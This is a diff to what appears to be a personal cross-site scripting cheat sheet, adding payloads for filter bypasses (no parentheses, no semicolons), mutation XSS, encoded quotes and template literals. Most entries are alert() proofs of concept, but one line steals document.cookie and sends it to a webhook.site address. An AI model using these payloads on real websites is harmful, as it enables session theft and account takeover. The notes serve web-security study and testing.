@@ -27,7 +27,7 @@
 // <svg onload="alert(1)'>
 // <img src=1 onerror=alert(1)>
 // <iframe src=1 onload=alert(1)>
-// <img src=1 onerror="new Image().src='https://webhook.site/2dc62e00-4e6c-4a13-a2ff-0cc59cc7dd90?cookie='+document.cookie;">
+// <img src=1 onerror="new Image().src='https://webhook.site/84ef8df6-e266-4ac4-85d4-1aef0b012f52?cookie='+document.cookie;">
 // <a href="javascript:alert('Hello!')">Click me</a>;
 //* JSON
 // if the application is returning a json response
@@ -59,6 +59,16 @@
 // if you can trick the victom to click a button ex: x
 // and the page has a canonical link tag that you can add atributes to
 // use : <link rel="canonical" href="ex" accesskey="x" onclick="alert(1)">
+//* banned parenthesis
+// you need to call funtions without them like
+// <script>onerror=alert;throw 1337</script>
+//* banned parentheses and semicolons
+// <script>{onerror=alert}throw 1337</script>
+//* mxss
+// utilises browers parsing
+// <?xml >s<img src=x onerror=alert(1)> ?>
+// <noscript><p alt="</noscript><img src=x onerror=alert(1)>">
+// <!-- </textarea><script>alert('miaw')</script>
 //! some third party libraries
 //* JQuery
 // $('#backLink').attr("href", javascript:alert(1))
@@ -89,3 +99,11 @@
 //* if the single quote is escaped
 // use : \';alert(document.domain)//
 // in here you're backslash will escape the one added by the application
+//* if the single quotes are encoded
+// if it's in an onClick event handler the html parser
+// will resolve &apos; to single quote before js executes
+// use &apos;-alert(document.domain)-&apos;
+//* if the controllable data is inside a template literal
+// ${alert(document.domain)}
+//! Client-side template injection
+
